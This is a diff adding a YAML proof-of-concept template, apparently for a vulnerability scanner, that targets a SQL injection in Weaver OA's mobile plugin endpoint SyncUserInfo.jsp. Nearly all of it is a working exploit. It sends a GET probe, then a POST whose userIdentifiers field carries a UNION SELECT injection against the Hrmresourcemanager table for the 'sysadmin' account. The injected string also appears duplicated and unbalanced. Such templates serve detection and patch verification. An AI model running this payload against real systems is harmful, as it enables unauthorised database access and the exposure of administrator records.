@@ -1,0 +1,27 @@
+id: poc-yaml-weaver-mobile-plugin-syncuserinfo-sqli
+info:
+  name: 泛微OA 移动办公系统 SyncUserInfo.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: weaver
+  osprey-id: vb_2019_0062
+variables:
+  r_empty: repeat(" ", 800)
+requests:
+- method: GET
+  path: /mobile/plugin/SyncUserInfo.jsp
+  expression: 'contains(body, "{\"userList\":[]}")
+
+    '
+- method: POST
+  path: /mobile/plugin/SyncUserInfo.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userIdentifiers=-1) {{.r_empty}} union select/**/1,Null,Null,Null,Null,Null,Null,Null
+    from Hrmresourcemanager where loginid=('sysadmin'union select/**/1,Null,Null,Null,Null,Null,Null,Null
+    from Hrmresourcemanager where loginid=('sysadmin'"
+  expression: 'contains(body, "{\"id\":\"1\"")
+
+    '
+transport: http
